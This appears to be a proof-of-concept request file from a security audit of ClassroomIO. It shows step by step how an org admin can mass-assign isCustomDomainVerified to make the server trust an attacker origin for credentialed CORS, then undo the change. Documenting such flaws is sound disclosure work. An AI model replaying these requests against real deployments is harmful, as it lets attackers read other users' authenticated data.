### VULN-021 — isCustomDomainVerified mass-assignment -> instance-wide credentialed-CORS trust
### <EVIL> = an attacker-chosen hostname (random per run, e.g. evil-<hex>.example)

### [baseline] Untrusted origin is NOT reflected.
GET http://localhost:21527/
Origin: http://<EVIL>
### -> (no Access-Control-Allow-Origin header)

### [poison] Org admin self-asserts the domain is verified (NO DNS/ownership check).
PUT http://localhost:21527/organization
Cookie: classroomio.session_token=<ADMIN_SESSION>
cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
Content-Type: application/json

{"customDomain":"<EVIL>","isCustomDomainVerified":true}
### -> HTTP 200; DB now organization.customDomain=<EVIL>, isCustomDomainVerified=true;
###    trustCustomDomainHostname(<EVIL>) added it to the process-wide verified set.

### [proof] The SAME untrusted origin is now reflected WITH credentials.
GET http://localhost:21527/
Origin: http://<EVIL>
### -> Access-Control-Allow-Origin: http://<EVIL>
### -> Access-Control-Allow-Credentials: true
###    A page on http://<EVIL> can now read authenticated API responses cross-origin.

### [restore] Untrust + clear the org row (exploit does this automatically).
PUT http://localhost:21527/organization
Cookie: classroomio.session_token=<ADMIN_SESSION>
cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
Content-Type: application/json

{"customDomain":null,"isCustomDomainVerified":false}
### -> HTTP 200; <EVIL> untrusted again (no longer reflected).
